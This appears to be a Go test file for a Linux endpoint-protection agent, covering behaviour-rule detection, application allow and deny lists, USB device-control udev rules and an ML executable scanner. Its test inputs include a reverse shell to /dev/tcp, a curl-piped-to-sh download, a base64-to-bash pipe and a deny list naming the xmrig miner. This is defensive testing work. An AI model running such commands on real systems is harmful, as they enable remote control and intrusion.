package fleet

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/AntiVirus/agent/linux/pkg/ml"
)

func policyWith(modules map[string]map[string]interface{}) Policy {
	return Policy{RealtimeProtection: true, Modules: modules}
}

func asrAll(mode string) map[string]interface{} {
	m := map[string]interface{}{}
	for _, k := range []string{"blockWebshellCreation", "blockLolbinAbuse", "blockObfuscatedScripts", "blockUntrustedUsbProcesses", "blockCredentialStealingLsass"} {
		m[k] = mode
	}
	return m
}

func has(ds []RuleDecision, rule string) bool {
	for _, d := range ds {
		if d.Rule == rule {
			return true
		}
	}
	return false
}

func TestLinuxBehaviourRules(t *testing.T) {
	p := policyWith(map[string]map[string]interface{}{"attackSurface": asrAll("block")})
	web := EvaluateProcess(p, ProcInfo{Exe: "/usr/bin/bash", Cmdline: "bash -c id"}, ProcInfo{Exe: "/usr/sbin/nginx"}, "")
	if !has(web, "attackSurface.blockWebshellCreation") || strongest(web) != "block" {
		t.Fatalf("webshell not caught: %+v", web)
	}
	dl := EvaluateProcess(p, ProcInfo{Exe: "/usr/bin/bash", Cmdline: "bash -c curl -s http://x/i.sh | sh"}, ProcInfo{Exe: "/usr/bin/sshd"}, "")
	if !has(dl, "attackSurface.blockLolbinAbuse") {
		t.Fatalf("download pipe not caught: %+v", dl)
	}
	rev := EvaluateProcess(p, ProcInfo{Exe: "/usr/bin/bash", Cmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, ProcInfo{}, "")
	if !has(rev, "attackSurface.blockLolbinAbuse") {
		t.Fatal("reverse shell not caught")
	}
	b64 := EvaluateProcess(p, ProcInfo{Exe: "/usr/bin/sh", Cmdline: "sh -c echo aGk= | base64 -d | bash"}, ProcInfo{}, "")
	if !has(b64, "attackSurface.blockObfuscatedScripts") {
		t.Fatal("base64 pipe not caught")
	}
	if len(EvaluateProcess(p, ProcInfo{Exe: "/usr/bin/ls", Cmdline: "ls -la /tmp"}, ProcInfo{Exe: "/usr/bin/bash"}, "")) != 0 {
		t.Fatal("benign command flagged")
	}
	audit := policyWith(map[string]map[string]interface{}{"attackSurface": asrAll("audit")})
	if strongest(EvaluateProcess(audit, ProcInfo{Exe: "/media/usb/run.bin"}, ProcInfo{}, "")) != "audit" {
		t.Fatal("audit mode should not block")
	}
	excluded := policyWith(map[string]map[string]interface{}{"attackSurface": asrAll("block"),
		"antimalware": {"exclusionProcesses": []interface{}{"bash"}}})
	if len(EvaluateProcess(excluded, ProcInfo{Exe: "/usr/bin/bash", Cmdline: "curl x | sh"}, ProcInfo{}, "")) != 0 {
		t.Fatal("exclusion ignored")
	}
}

func TestLinuxAppControl(t *testing.T) {
	deny := policyWith(map[string]map[string]interface{}{"applicationControl": {"mode": "enforce-denylist",
		"blockedApps": []interface{}{"xmrig", "deadbeef"}}})
	if !has(EvaluateProcess(deny, ProcInfo{Exe: "/tmp/xmrig"}, ProcInfo{}, ""), "applicationControl.blockedApps") {
		t.Fatal("name deny failed")
	}
	if !has(EvaluateProcess(deny, ProcInfo{Exe: "/opt/x/tool"}, ProcInfo{}, "DEADBEEF"), "applicationControl.blockedApps") {
		t.Fatal("hash deny failed")
	}
	allow := policyWith(map[string]map[string]interface{}{"applicationControl": {"mode": "enforce-allowlist",
		"allowedHashes": []interface{}{"abc"}}})
	if len(EvaluateProcess(allow, ProcInfo{Exe: "/usr/bin/python3"}, ProcInfo{}, "")) != 0 {
		t.Fatal("system path should be allowed")
	}
	if !has(EvaluateProcess(allow, ProcInfo{Exe: "/home/a/game"}, ProcInfo{}, "zzz"), "applicationControl.allowlist") {
		t.Fatal("unlisted program should be blocked")
	}
	if len(EvaluateProcess(allow, ProcInfo{Exe: "/home/a/tool"}, ProcInfo{}, "abc")) != 0 {
		t.Fatal("allowed hash should pass")
	}
}

func TestDeviceControlRules(t *testing.T) {
	p := policyWith(map[string]map[string]interface{}{"deviceControl": {"enabled": true, "usbStorage": "block",
		"usbAllowedIds": []interface{}{"0781:5581", "bad"}, "printing": "block"}})
	rules, notes := DeviceControlRules(p)
	for _, want := range []string{`ATTRS{idVendor}=="0781", ATTRS{idProduct}=="5581", GOTO="fenrir_end"`, `ATTR{bInterfaceClass}=="08", ATTR{authorized}="0"`} {
		if !strings.Contains(rules, want) {
			t.Fatalf("missing %q in\n%s", want, rules)
		}
	}
	if len(notes) != 2 {
		t.Fatalf("notes: %v", notes)
	}
	ro := policyWith(map[string]map[string]interface{}{"deviceControl": {"enabled": true, "usbStorage": "read-only"}})
	if r, _ := DeviceControlRules(ro); !strings.Contains(r, "blockdev --setro") {
		t.Fatal("read-only rule missing")
	}
	root := t.TempDir()
	if summary, _, err := ApplyDeviceControl(p, root, true); err != nil || summary != "usb=block" {
		t.Fatalf("apply: %q %v", summary, err)
	}
	if summary, _, _ := ApplyDeviceControl(p, root, true); summary != "" {
		t.Fatal("unchanged rules should not re-apply")
	}
	off := policyWith(map[string]map[string]interface{}{"deviceControl": {"enabled": false}})
	ApplyDeviceControl(off, root, true)
	if _, err := os.Stat(filepath.Join(root, udevRulesPath)); !os.IsNotExist(err) {
		t.Fatal("rules should be removed when device control is off")
	}
}

func TestScannerUsesMLModel(t *testing.T) {
	model, err := ml.LoadModelFile("../../../../ml/models/fenrir-pe-v1.json.gz")
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	data, _ := os.ReadFile("../../../../ml/testdata/hello64.exe")
	os.WriteFile(filepath.Join(dir, "a.exe"), data, 0o644)
	os.WriteFile(filepath.Join(dir, "notes.txt"), []byte("hello"), 0o644)
	s := NewScanner(filepath.Join(dir, "q"))
	threshold, _ := model.Threshold("balanced")
	s.SetModel(model, threshold)
	if _, findings := s.ScanPaths([]string{dir}, nil, false, 0); len(findings) != 0 {
		t.Fatalf("clean test program flagged: %+v", findings)
	}
	s.SetModel(model, 1e-12) // positive control: everything that is a PE is flagged
	_, findings := s.ScanPaths([]string{dir}, nil, false, 0)
	if len(findings) != 1 || !strings.HasPrefix(findings[0].Family, "ML.Static.PE") {
		t.Fatalf("ML path not exercised: %+v", findings)
	}
}
